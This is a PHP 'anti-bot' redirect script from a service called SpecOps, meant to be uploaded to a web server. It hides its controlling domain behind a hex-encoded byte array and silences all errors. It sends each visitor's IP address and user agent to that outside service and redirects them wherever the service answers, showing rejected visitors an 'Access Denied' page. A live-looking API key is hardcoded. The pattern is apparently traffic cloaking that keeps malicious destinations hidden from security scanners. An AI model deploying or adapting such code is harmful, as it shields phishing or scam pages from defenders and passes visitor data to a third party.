<?php
/**
 * SpecOps Anti-Bot Redirect Script
 * Compatible with PHP 7.0 - 8.2+
 *
 * Generated for: es
 *
 * Upload this file anywhere on your server.
 * Example: https://yoursite.com/go/index.php
 */

// Suppress all errors and warnings for PHP 8.2+ compatibility
error_reporting(0);
@ini_set('display_errors', '0');

// ============================================
// CONFIGURATION
// ============================================

$api_key = 'ak_XTnA8r0DC0SqPnrUy6RidkxzsPMBwExC0ct5ybrHRC91H96iM9BOHND4HRXpR8Cd';
$redirect_to = 'google.com';

// Mobile Redirect Configuration
$mobile_redirect_enabled = false;
$mobile_redirect_url = '';

// ============================================
// DO NOT EDIT BELOW THIS LINE
// ============================================

// Core initialization
$_0x4f9ba=array(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x73,0x70,0x65,0x63,0x6f,0x70,0x73,0x2e,0x70,0x72,0x6f);$_0x4f9bd=count($_0x4f9ba);$_0x4f9bc='';for($_0x4f9bb=0;$_0x4f9bb<$_0x4f9bd;$_0x4f9bb++){$_0x4f9bc.=chr($_0x4f9ba[$_0x4f9bb]);}$specops_domain=$_0x4f9bc;

// Mobile Detection Function
function is_mobile_device() {
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    $mobile_keywords = array(
        'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry', 
        'windows phone', 'opera mini', 'opera mobi', 'webos', 
        'palm', 'symbian', 'nokia', 'samsung', 'lg', 'htc', 
        'kindle', 'silk', 'tablet', 'playbook'
    );
    foreach ($mobile_keywords as $keyword) {
        if (strpos($user_agent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

function get_client_ip() {
    $headers = array(
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    );
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $parts = explode(',', $ip);
                $ip = trim($parts[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return '0.0.0.0';
}

$client_ip = get_client_ip();
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$is_mobile = is_mobile_device();

// Determine final redirect URL (mobile or desktop)
$final_redirect_url = $redirect_to;
$use_mobile_redirect = false;
if ($mobile_redirect_enabled && $is_mobile && !empty($mobile_redirect_url)) {
    $final_redirect_url = $mobile_redirect_url;
    $use_mobile_redirect = true;
}

$params = array(
    'key' => $api_key,
    'redirect_to' => $final_redirect_url
);
$api_url = $specops_domain . '/api/redirect?' . http_build_query($params);

$request_headers = array(
    'X-Specops-Auth: x-specops-php-auth-2024',
    'X-Client-IP: ' . $client_ip,
    'X-Client-User-Agent: ' . $user_agent,
    'X-Real-IP: ' . $client_ip,
    'X-Forwarded-For: ' . $client_ip
);

// Try cURL first
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    if ($response !== false && $http_code >= 300 && $http_code < 400) {
        $headers = substr($response, 0, $header_size);
        if (preg_match('/^Location:\s*(.+)$/mi', $headers, $matches)) {
            // If mobile redirect is enabled and user is on mobile, force mobile URL
            if ($use_mobile_redirect) {
                header('Location: ' . $mobile_redirect_url, true, $http_code);
            } else {
                header('Location: ' . trim($matches[1]), true, $http_code);
            }
            exit;
        }
    }
}
// Fallback to file_get_contents
else {
    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => implode("\r\n", $request_headers),
            'follow_location' => 0,
            'timeout' => 10
        ),
        'ssl' => array(
            'verify_peer' => true,
            'verify_peer_name' => true
        )
    );
    $context = stream_context_create($opts);
    $response = @file_get_contents($api_url, false, $context);

    if (isset($http_response_header)) {
        foreach ($http_response_header as $hdr) {
            if (stripos($hdr, 'Location:') === 0) {
                // If mobile redirect is enabled and user is on mobile, force mobile URL
                if ($use_mobile_redirect) {
                    header('Location: ' . $mobile_redirect_url);
                } else {
                    header($hdr);
                }
                exit;
            }
        }
    }
}

// Access denied page
http_response_code(403);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Access Denied</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff}
.container{text-align:center;padding:2rem;max-width:400px}
.logo{width:80px;height:80px;margin:0 auto 1.5rem;position:relative}
.logo::before{content:'';position:absolute;inset:-10px;background:radial-gradient(circle,rgba(34,213,17,0.3) 0%,transparent 70%);border-radius:50%;animation:pulse 2s ease-in-out infinite}
.logo svg{width:80px;height:80px;position:relative;z-index:1}
@keyframes pulse{0%,100%{opacity:0.5;transform:scale(1)}50%{opacity:1;transform:scale(1.05)}}
h1{font-size:1.75rem;font-weight:700;margin-bottom:0.5rem;background:linear-gradient(135deg,#00934B,#22D511,#BEF000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
p{color:#6b7280;font-size:0.875rem;margin-bottom:1.5rem}
.badge{display:inline-flex;align-items:center;gap:0.5rem;padding:0.5rem 1rem;background:rgba(0,147,75,0.1);border:1px solid rgba(34,213,17,0.2);border-radius:9999px;font-size:0.75rem;color:#22D511;text-transform:uppercase;letter-spacing:0.05em}
.badge::before{content:'';width:6px;height:6px;background:#22D511;border-radius:50%;animation:blink 1.5s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
</style>
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="45" stroke="#00934B" stroke-width="2" fill="none"/><circle cx="50" cy="50" r="35" stroke="#22D511" stroke-width="2" fill="none"/><circle cx="50" cy="50" r="25" stroke="#BEF000" stroke-width="2" fill="none"/><circle cx="50" cy="50" r="8" fill="#22D511"/><circle cx="50" cy="50" r="8" fill="#22D511"/><path d="M50 5 L50 20 M50 80 L50 95 M5 50 L20 50 M80 50 L95 50" stroke="#22D511" stroke-width="2"/></svg></div>
<h1>Access Denied</h1>
<p>This resource is protected by advanced security measures</p>
<div class="badge">Security Active</div>
</div>
</body>
</html>